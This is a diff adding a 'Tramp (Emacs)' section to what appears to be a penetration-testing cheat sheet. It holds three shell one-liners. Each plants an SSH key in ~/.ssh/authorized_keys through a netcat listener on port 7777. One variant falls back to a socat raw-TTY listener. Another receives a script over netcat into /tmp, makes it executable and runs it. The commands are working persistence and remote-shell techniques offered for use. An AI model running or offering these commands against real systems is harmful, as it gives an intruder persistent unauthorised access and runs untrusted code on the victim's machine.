@@ -74,8 +74,20 @@ export SHELL=bash; export TERM=xterm-256color; stty rows 60 columns 126
 ```
 
 ### Tramp (Emacs)
+
+#### Basic
 ```
 ls $HOME && { { ls $HOME/.ssh || mkdir $HOME/.ssh; } && nc -lp 7777 >> $HOME/.ssh/authorized_keys; }
+```
+
+#### Socat Pattern
+```
+ls $HOME && { { ls $HOME/.ssh || mkdir $HOME/.ssh; } && nc -lp 7777 >> $HOME/.ssh/authorized_keys; } || socat file:`tty`,raw,echo=0 TCP-L:7777;
+```
+
+#### Shell Upgrade Pattern
+```
+ls $HOME && { { ls $HOME/.ssh || mkdir $HOME/.ssh; } && nc -lp 7777 >> $HOME/.ssh/authorized_keys; } || { nc -lp 7777 > /tmp/upgrade-shell.sh && chmod +x /tmp/upgrade-shell.sh && . /tmp/upgrade-shell.sh; }
 ```
 
 ## CVEs
